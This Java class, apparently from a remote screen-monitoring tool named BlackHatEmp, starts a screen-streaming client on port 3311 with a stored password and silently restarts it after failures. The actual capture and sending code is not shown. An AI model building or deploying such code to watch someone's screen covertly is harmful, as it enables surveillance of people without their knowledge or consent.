/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package threading;

import Client.Client_Screen;
import java.awt.AWTException;
import java.io.IOException;

/**
 *
 * @author abaza
 */
public class Screen_Monitor implements Runnable {

    Client.Client_Screen Screen_Record = null;

    void screen_record() {
        init();
    }

    private void init() {
        try {
            Screen_Record = new Client_Screen();
            Screen_Record.init(blackhatemp.BlackHatEmp.PASSWORD, 3311);
        } catch (IOException | AWTException ex) {
            restart();
        }
    }

    public void Stop() {
        if (Screen_Record != null) {
            Screen_Record.StopSendScreen();
            Screen_Record = null;
        }
    }

    public void restart() {
        try {
            Stop();
            Thread.sleep(500);
            init();
        } catch (InterruptedException ex) {
        }

    }

    @Override
    public synchronized void run() {
        if (Screen_Record == null) {
            init();
            try {
                Thread.sleep(500);
            } catch (InterruptedException ex) {
            }
            Screen_Record.setPriority(3);
            Screen_Record.run();
        } else {
            Screen_Record.run();
        }

    }
}
